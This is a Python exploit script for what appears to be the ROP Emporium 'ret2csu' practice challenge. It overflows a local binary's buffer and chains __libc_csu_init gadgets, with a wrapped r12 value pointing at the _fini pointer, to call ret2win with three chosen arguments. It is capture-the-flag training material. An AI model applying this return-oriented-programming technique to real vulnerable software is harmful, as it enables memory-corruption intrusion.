import struct
import subprocess

def p64(value: int) -> bytes:
    return struct.pack('<Q', value)

def main():
    elf = './ret2csu'
    # Goal: ret2win(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)

    # ROP gadgets
    ret2win_plt = 0x400510
    pop_rdi = 0x4006a3
    pop_r12_r13_r14_r15 = 0x40069c
    mov_rdx_r15__mov_rsi_r14__mov_edi_r13d__call_at_r12_rbx8 = 0x400680

    # Constants
    padding = b'A'*8*4
    rbx_val = 0x400640  # rbp value when executing `call qword [r12 + rbx*8]`
    rbp_val = rbx_val+1 # to prevent jump after `0x400691 <__libc_csu_init+81>:	cmp rbp,rbx`
    fini_ptr = 0x600e48 # target value
    # NOTE: r12_val=0xfffffffffe5fdc48 so that when `r12 + rbx*8` is evaluated, set high value for r12 such when rbx*8 is added it overflows and the memory address evaluates to 0x600e48
    r12_val = 0x10000000000000000 + fini_ptr - (rbx_val*8) # 0x10000000000600e48-(0x400640*8)==0xfffffffffe5fdc48
    r12_bytes = p64(r12_val)
    rdi_bytes = p64(0xdeadbeefdeadbeef)
    rsi_bytes = p64(0xcafebabecafebabe)
    rdx_bytes = p64(0xd00df00dd00df00d)

    # ROP chain
    rop_chain = b''
    rop_chain += p64(pop_r12_r13_r14_r15) + r12_bytes + rdi_bytes + rsi_bytes + rdx_bytes # pop r12; pop r13; pop r14; pop r15; ret
    rop_chain += p64(mov_rdx_r15__mov_rsi_r14__mov_edi_r13d__call_at_r12_rbx8) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword [r12 + rbx*8]
    rop_chain += p64(0x00) * 7 # To maintain stack integrity after calling _fini function (pointed to by r12)
    rop_chain += p64(pop_rdi) + rdi_bytes # Need to set rdi again
    rop_chain += p64(ret2win_plt) # ret2win(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)

    # Get flag
    payload = padding + p64(rbp_val) + rop_chain
    p = subprocess.run(elf, input=payload)
    
if __name__ == '__main__':
    main()
